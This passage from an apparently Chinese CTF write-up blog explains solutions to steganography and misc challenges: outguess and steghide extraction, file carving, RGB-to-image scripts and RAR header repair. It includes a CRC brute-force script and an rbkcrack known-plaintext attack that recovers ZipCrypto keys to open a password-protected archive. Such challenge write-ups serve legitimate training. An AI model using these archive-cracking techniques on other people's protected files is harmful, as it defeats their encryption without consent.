fuck/Ook!</code>。在线网站解密。拿到flag。</p><h3 id="misc21"><a href="#misc21" class="headerlink" title="misc21"></a>misc21</h3><p>outguess解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k 123456 -r 4.jpg hidden.txt</span><br></pre></td></tr></table></figure><p>压缩包放到winhex中发现尾部，有09 0A 0D 20 这些交替出现。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/7.jpg" alt="7"></p><p>放到notepad++中，直接十六进制转换ascii。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">09→ tab符</span><br><span class="line">20→空格</span><br><span class="line">0A→\r</span><br><span class="line">0D→\n</span><br></pre></td></tr></table></figure><p>然后放到sublim中替换为莫斯密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tab 替换 -</span><br><span class="line">空格 替换 .</span><br><span class="line">tab 替换&#x2F;</span><br><span class="line">\n 替换&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/8.png" alt="8"></p><p>解密得到flag。</p><h3 id="setg10"><a href="#setg10" class="headerlink" title="setg10"></a>setg10</h3><p>拿到一张图片，放入winhex中发现，一串类似于base64的值，但是字符串最后有两个点，两个点替换为==。base64解码。</p><h3 id="stega10"><a href="#stega10" class="headerlink" title="stega10"></a>stega10</h3><p><code>https://www.lanzous.com/i9b0ksd</code></p><p>下载之后拿到一个压缩包，压缩包中有一个文件名字为密码，打开之后有十个txt文件，名字也为密码，而且文件大小很少，尝试爆破crc把这几个文件的内容组成压缩包密码。</p><p>这里文件大小为1字节，所以尝试一下一位crc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">dic&#x3D;string.printable</span><br><span class="line">#输入密码文件的CRC码</span><br><span class="line">crcl&#x3D;[0xF3B61B38,0xF3B61B38,0X6ABF4A82,0X5ED1937E,0X09b9265b,0x84b12bae,0x70659eff,0x90b077e1,0x6abf4a82]</span><br><span class="line">key &#x3D; &#39;&#39;</span><br><span class="line">for crc in crcl:</span><br><span class="line">    for i in dic:</span><br><span class="line">        if crc&#x3D;&#x3D;(binascii.crc32(i)&amp;0xffffffff):</span><br><span class="line">            key &#x3D;key + i</span><br><span class="line">            print key</span><br></pre></td></tr></table></figure><h3 id="红包第五题"><a href="#红包第五题" class="headerlink" title="红包第五题"></a>红包第五题</h3><p>打开压缩包里面有一个mp3，然后把压缩包放入01eidoter中发现，提示载入错误，说明还有别的文件，然后发现压缩包尾部有jpg的文件尾部，直接提取出jpg。</p><p>jpg头部<code>FFD8FFE0</code></p><p>jpg尾部<code>8A0FFD9</code></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/15.png" alt="15"></p><p>提取出jpg使用steghide工具，提取文本，在该工具目录下发现flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F:\CTF-tools\图片隐写\steghide&gt;steghide.exe extract -sf C:\Users\12521\Desktop\1.jpg</span><br><span class="line">Enter passphrase:</span><br><span class="line">wrote extracted data to &quot;flag.txt&quot;.</span><br></pre></td></tr></table></figure><p>其中有一串密文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aHR0cHM6Ly93d3cubGFuem91cy5jb20vaTlkcGp4ZQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>解密拿到一个网址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.lanzous.com&#x2F;i9dpjxe</span><br></pre></td></tr></table></figure><p>拿到一个压缩包，打开里面的txt是许多数字。但是没有大于F的所以直接<code>16进制→10进制→ascii码</code>。两个一组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady_str=open(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(steady_str),<span class="number">2</span>):</span><br><span class="line">    flag+=chr(int(steady_str[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>转换之后拿到一个坐标。使用正则表达式提取坐标。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f=open(<span class="string">&#x27;tupian.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">steady_key=re.findall(<span class="string">&#x27;\((.*?)\)&#x27;</span>,f)</span><br><span class="line">print(steady_key)</span><br></pre></td></tr></table></figure><p>将坐标写入文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady_flag=open(<span class="string">&#x27;steady_flag.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_key:</span><br><span class="line">    steady_flag.write(i+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>查看坐标的数量，进行分解，求得长和宽。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">5328</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">if</span> (i*j)==a:</span><br><span class="line">print(i,j)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">36</span>, <span class="number">148</span>)</span><br><span class="line">(<span class="number">37</span>, <span class="number">144</span>)</span><br><span class="line">(<span class="number">48</span>, <span class="number">111</span>)</span><br><span class="line">(<span class="number">72</span>, <span class="number">74</span>)</span><br><span class="line">(<span class="number">74</span>, <span class="number">72</span>)</span><br><span class="line">(<span class="number">111</span>, <span class="number">48</span>)</span><br><span class="line">(<span class="number">144</span>, <span class="number">37</span>)</span><br></pre></td></tr></table></figure><p>RDB画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">x = <span class="number">72</span> <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">74</span> <span class="comment">#y坐标  x*y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))<span class="comment">#创建图片</span></span><br><span class="line">file = open(<span class="string">&#x27;rgb2.txt&#x27;</span>) <span class="comment">#打开rbg值文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过一个个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">        line = file.readline()<span class="comment">#获取一行</span></span><br><span class="line">       <span class="comment"># line = line.replace(&#x27;\n&#x27;,&#x27;&#x27;)</span></span><br><span class="line">        print(line)</span><br><span class="line">        rgb = line.split(<span class="string">&quot;,&quot;</span>)<span class="comment">#分离rgb</span></span><br><span class="line">        print(rgb)</span><br><span class="line">        im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))<span class="comment">#rgb转化为像素</span></span><br><span class="line">im.show()</span><br><span class="line">im.save(<span class="string">&#x27;1.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>扫码拿到flag。</p><h3 id="红包第八题"><a href="#红包第八题" class="headerlink" title="红包第八题"></a>红包第八题</h3><p>大致原理就是一个mp4文件，读取之后转十六进制，然后每个十六进制反序。得到一个新的mp4文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">&#x27;NBA.mp4&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data=f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">print</span> hex(ord(i))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data=f.readlines()</span><br><span class="line">d=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    result=i.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(result)!=<span class="number">2</span>:</span><br><span class="line">        d+=chr(int(<span class="string">&#x27;0x&#x27;</span>+result+<span class="string">&#x27;0&#x27;</span>,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        d+=chr(int(<span class="string">&#x27;0x&#x27;</span>+result[::<span class="number">-1</span>],<span class="number">16</span>))</span><br><span class="line"><span class="keyword">print</span> d</span><br></pre></td></tr></table></figure><h3 id="Triglavian"><a href="#Triglavian" class="headerlink" title="Triglavian"></a>Triglavian</h3><p>拿到一个压缩包需要密码。要么爆破，要么伪加密，要么明文攻击。前两者都不是但是又只有一个文件，不符合明文攻击，这里我们需要创建一个文件。因为压缩包里就一张<code>Triglavian.png</code>图片，而png图片的开头有16字节是不变的，为<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code>。<br>这里我们需要自己创建一个<code>png_header.png</code>文件，内容就是由那16字节组成。</p><p>使用工具开始攻击–<code>rbkcrack.exe</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; rbkcrack.exe -C Triglavian.zip -c Triglavian.png -p PNG_header.png</span><br><span class="line"></span><br><span class="line">-C 要攻击的压缩包</span><br><span class="line">-c 要攻击的压缩包里面的文件</span><br><span class="line">-p 刚创建的明文文件名</span><br></pre></td></tr></table></figure><p>能破解得到ZipCrypto的内部的三个key：<code>be056038 0a143c0c 1ea08ca5</code>。</p><p>用这三个key来解码文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; rbkcrack.exe -C Triglavian.zip -c Triglavian.png -k be056038 0a143c0c 1ea08ca5 -d Triglavian.png</span><br><span class="line"></span><br><span class="line">-C 要攻击的压缩包</span><br><span class="line">-c 要攻击的压缩包里面的文件</span><br><span class="line">-k 刚生成的三个key</span><br><span class="line">-d 最终还原的文件名</span><br></pre></td></tr></table></figure><p>最终在同路径下得到压缩的文件。</p><h1 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h1><h2 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h2><h3 id="一个普通的压缩包-xp0intCTF"><a href="#一个普通的压缩包-xp0intCTF" class="headerlink" title="一个普通的压缩包(xp0intCTF)"></a>一个普通的压缩包(xp0intCTF)</h3><p>打开之后是一个压缩包，使用winrar打开提示文件头部错误，压缩包中的文件可以正常打开，打开之后提示flag is not here，仔细看提示发现还有一个secrect.png文件。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/16.png" alt="16"></p><p>这里就需要分析一下rar的结构，拖入01editor。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/17.png" alt="17"></p><p>发现png的文件头出了问题。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/18.png" alt="18"></p><p>现png那的文件头类型A8 3C 7A，把7A修改为74。最后发现修改成功。</p><p>得到secret.png，查看一张纯白的图片，用010Editor查看是一个gif的文件。放入stegsolve。发现一半二维码。</p><p>最后使用PS来进行修改。拿到flag。</p><h3 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h3><p>crc校验码来爆破出内部文件的内容，拿到一串base64</p><p><code>+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</code></p><p>解码之后有乱码，说明解码之后应该是一个文件，尝试python解码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f=<span class="string">&#x27;z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==&#x27;</span></span><br><span class="line">f=open(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(base64.b64decode(f))</span><br></pre></td></tr></table></figure><p>解码之后的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">蠍s  </span><br><span class="line">       ?z €# I   T   ?kcI3    CMT溯AO?H予彉EQAF鳠 B|m+竔薀(,3(麳??,Fv崤韌Mr轒J諅t緬?</span><br><span class="line">斖井?&quot;€J鱰 ?       b宴誒cI0     flag.txt ?iffix the file and get the flag?&#123; @ </span><br></pre></td></tr></table></figure><p>提示修复，直接访问winhex修复，查看文件尾部<code>C43D7B00400700</code>，网上wp说这是文件尾部，但是我查看了好多rar包尾部都不是<code>C43D7B00400700</code>。这里直接修补上头部。<code>526172211A0700</code>。</p><p>修复之后，在压缩包注释中有flag。这里要注意如果压缩包中有注释的话，压缩包的十六进制中会有CMT字段。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/19.png" alt="19"></p><h3 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h3><p>一串二进制，直接转换成十六进制，然后发现是十六进制是rar的文件，直接转换成rar。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">beginnum = <span class="number">0</span></span><br><span class="line">endnum = <span class="number">4</span></span><br><span class="line">b = []</span><br><span class="line">f = open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">4</span>):</span><br><span class="line">    b.append(hex(int(a[i:i+<span class="number">4</span>], <span class="number">2</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    i = i[<span class="number">2</span>:]</span><br><span class="line">    print(i)</span><br><span class="line">    f.write(i)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>这里是四个一组转化成十六进制，也可以八个一组转化成十六进制，但是涉及到0的问题，十六进制一般为两个数字，如果不足我们需要补0，所以我们最好是四个一组转换。</p><p>base64解码得到flag。</p><h3 id="红绿灯"><a href="#红绿灯" class="headerlink" title="红绿灯"></a>红绿灯</h3><p>首先使用画图工具随便定位一个像素，如果为绿色则+1，红色+0。使用如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"> </span><br><span class="line">savepath=<span class="string">&#x27;C:/Users/12521/flag/&#x27;</span></span><br><span class="line">im=Image.open(<span class="string">&#x27;C:/Users/12521/1.gif&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  im.save(savepath+<span class="string">&#x27;light&#123;0&#125;.png&#x27;</span>.format(im.tell()))</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    im.seek(im.tell()+<span class="number">1</span>)</span><br><span class="line">    im.save(savepath+<span class="string">&#x27;light&#123;0&#125;.png&#x27;</span>.format(im.tell()))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1168</span>):</span><br><span class="line">  image=Image.open(savepath+<span class="string">&#x27;light&#x27;</span>+str(i)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> image.getpixel((<span class="number">115</span>,<span class="number">55</span>))==<span class="number">251</span>:</span><br><span class="line">    flag+=str(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">elif</span> image.getpixel((<span class="number">115</span>,<span class="number">145</span>))==<span class="number">186</span>:</span><br><span class="line">    flag+=str(<span class="number">0</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>最后二进制转flag。</p><h3 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h3><p>一张图片，使用binwalk分析一下，有一个压缩包，尝试foremost或者dd命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ binwalk  /home/steady/桌面/steady/<span class="number">1.j</span>pg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"><span class="number">0</span>             <span class="number">0x0</span>             JPEG image data, EXIF standard</span><br><span class="line"><span class="number">12</span>            <span class="number">0xC</span>             TIFF image data, big-endian, offset of first image directory: <span class="number">8</span></span><br><span class="line"><span class="number">5005118</span>       <span class="number">0x4C5F3E</span>        PARity archive data</span><br><span class="line"><span class="number">6391983</span>       <span class="number">0x6188AF</span>        RAR archive data, version <span class="number">4.</span>x, first volume type: MAIN_HEAD</span><br></pre></td></tr></table></figure><p>DD命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ dd <span class="keyword">if</span>=<span class="number">1.j</span>pg of=flag.rar skip=<span class="number">6391983</span> bs=<span class="number">1</span></span><br><span class="line">记录了<span class="number">16301</span>+<span class="number">0</span> 的读入</span><br><span class="line">记录了<span class="number">16301</span>+<span class="number">0</span> 的写出</span><br><span class="line"><span class="number">16301</span> bytes (<span class="number">16</span> kB, <span class="number">16</span> KiB) copied, <span class="number">0.0386141</span> s, <span class="number">422</span> kB/s</span><br></pre></td></tr></table></figure><p>分离出一个压缩包但是需要密码。回到大象的图片，查看图片描述信息，发现在备注中有base64解密就是密码，修改压缩包中的图片的高度。拿到flag。</p><h3 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h3><p>打开一张图片，方式winhex查看，发现图片后面有许多数字。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/20.png" alt="20"></p><p>将十六进制放到winhex转换ascii、或者直接使用01editor，文件-&gt;导入十六进制，直接就被转换成了坐标。使用python脚本或者kali gnuplot工具也可以。</p><p>也可以使用python脚本转换十六进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">print(len(f))</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(f),<span class="number">2</span>):</span><br><span class="line">    flag+=chr(int(f[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>坐标生成二维码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib <span class="keyword">as</span> mpl</span><br><span class="line"> </span><br><span class="line">mpl.rcParams[<span class="string">&#x27;font.family&#x27;</span>] = <span class="string">&#x27;sans-serif&#x27;</span></span><br><span class="line">mpl.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = <span class="string">&#x27;NSimSun,Times New Roman&#x27;</span></span><br><span class="line"> </span><br><span class="line">x, y = np.loadtxt(<span class="string">&#x27;./flag.txt&#x27;</span>, delimiter=<span class="string">&#x27;,&#x27;</span>, unpack=<span class="literal">True</span>)</span><br><span class="line">plt.plot(x, y, <span class="string">&#x27;*&#x27;</span>, color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">plt.xlabel(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Data&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h3><p>打开之后是许多坐标，先分解一下图片长和宽。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">61366</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">if</span> (i*j)==a:</span><br><span class="line">print(i,j)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">122 503</span><br><span class="line">503 122</span><br></pre></td></tr></table></figure><p>然后画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">x = <span class="number">503</span> <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">122</span> <span class="comment">#y坐标  x*y = 行数</span></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))<span class="comment">#创建图片</span></span><br><span class="line">file = open(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="comment">#打开rbg值文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过一个个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">        line = file.readline()<span class="comment">#获取一行</span></span><br><span class="line">        rgb = line.split(<span class="string">&quot;,&quot;</span>)<span class="comment">#分离rgb</span></span><br><span class="line">        im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))<span class="comment">#rgb转化为像素</span></span><br><span class="line">im.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="乌云邀请码"><a href="#乌云邀请码" class="headerlink" title="乌云邀请码"></a>乌云邀请码</h3><p>使用Stegsolve发现rgb的0位有蹊跷。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/21.png" alt="21"></p><p>使用data extract功能，save bin保存为1.txt拿到flag。</p><h3 id="普通的二维码"><a href="#普通的二维码" class="headerlink" title="普通的二维码"></a>普通的二维码</h3><p>拿到二维码扫描没有发现太多东西，直接拖入01eitoer，最后发现一串字符串，而且只有小于8的数字，猜测是八进制，查看长度是126正好是3的倍数。写脚本转换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span 